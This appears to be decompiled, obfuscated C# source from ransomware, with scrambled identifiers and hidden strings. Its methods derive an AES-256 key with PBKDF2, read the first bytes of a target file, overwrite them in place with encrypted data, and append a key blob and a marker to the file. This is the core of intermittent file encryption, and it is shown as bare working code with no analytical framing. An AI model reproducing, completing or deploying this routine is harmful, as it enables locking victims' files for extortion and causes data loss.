using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

public static class lYhjtoZEwiP
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] tLpScIfWbGuwzSS(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = godZkmxbzNii(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes godZkmxbzNii(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] UZnlEwjiRlDjb(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (zIVCbxjNHAKEFp.LODuDJpqfraiT == getString_0(107396942))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (zIVCbxjNHAKEFp.oGTbbrQcGNZ)
			{
				try
				{
					File.AppendAllText(zIVCbxjNHAKEFp.WkbhTUSGuRALk, getString_0(107355056) + string_0 + getString_0(107366237) + ex.Message + getString_0(107396730));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void BLdAeHFJCWOPw(string rsEXvxbzQmQPm, byte[] KaDekbYMdb, byte[] goEhPWjCuUA = null)
	{
		try
		{
			byte[] array = null;
			if (zIVCbxjNHAKEFp.LODuDJpqfraiT == getString_0(107396942))
			{
				array = (zIVCbxjNHAKEFp.hACCsLRJUFpmHw ? Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(zIVCbxjNHAKEFp.gfwqaUEKkZy) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366147)) + Convert.ToString(zIVCbxjNHAKEFp.AuTjMbZddlKo) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366147))) : Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(zIVCbxjNHAKEFp.gfwqaUEKkZy) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366156)) + Convert.ToString(zIVCbxjNHAKEFp.AuTjMbZddlKo) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366156))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(rsEXvxbzQmQPm, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(KaDekbYMdb, 0, KaDekbYMdb.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(rsEXvxbzQmQPm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!zIVCbxjNHAKEFp.hACCsLRJUFpmHw)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(goEhPWjCuUA, 0, goEhPWjCuUA.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (zIVCbxjNHAKEFp.hACCsLRJUFpmHw ? Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(zIVCbxjNHAKEFp.gfwqaUEKkZy) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366147)) + Convert.ToString(zIVCbxjNHAKEFp.AuTjMbZddlKo) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366147))) : Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(zIVCbxjNHAKEFp.gfwqaUEKkZy) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366156)) + Convert.ToString(zIVCbxjNHAKEFp.AuTjMbZddlKo) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366156))));
			FileStream fileStream2 = new FileStream(rsEXvxbzQmQPm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(KaDekbYMdb, 0, KaDekbYMdb.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(rsEXvxbzQmQPm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!zIVCbxjNHAKEFp.hACCsLRJUFpmHw)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(goEhPWjCuUA, 0, goEhPWjCuUA.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (zIVCbxjNHAKEFp.oGTbbrQcGNZ)
			{
				try
				{
					File.AppendAllText(zIVCbxjNHAKEFp.WkbhTUSGuRALk, getString_0(107355056) + rsEXvxbzQmQPm + getString_0(107366170) + ex.Message + getString_0(107396730));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (zIVCbxjNHAKEFp.hACCsLRJUFpmHw ? Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(zIVCbxjNHAKEFp.gfwqaUEKkZy) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366147)) + Convert.ToString(zIVCbxjNHAKEFp.AuTjMbZddlKo) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366147))) : Encoding.ASCII.GetBytes(zIVCbxjNHAKEFp.wKuxNAMIkOy(zIVCbxjNHAKEFp.gfwqaUEKkZy) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366156)) + Convert.ToString(zIVCbxjNHAKEFp.AuTjMbZddlKo) + zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107366156))));
			FileStream fileStream4 = new FileStream(rsEXvxbzQmQPm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(KaDekbYMdb, 0, KaDekbYMdb.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(rsEXvxbzQmQPm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!zIVCbxjNHAKEFp.hACCsLRJUFpmHw)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(goEhPWjCuUA, 0, goEhPWjCuUA.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static lYhjtoZEwiP()
	{
		Strings.CreateGetStringDelegate(typeof(lYhjtoZEwiP));
	}
}
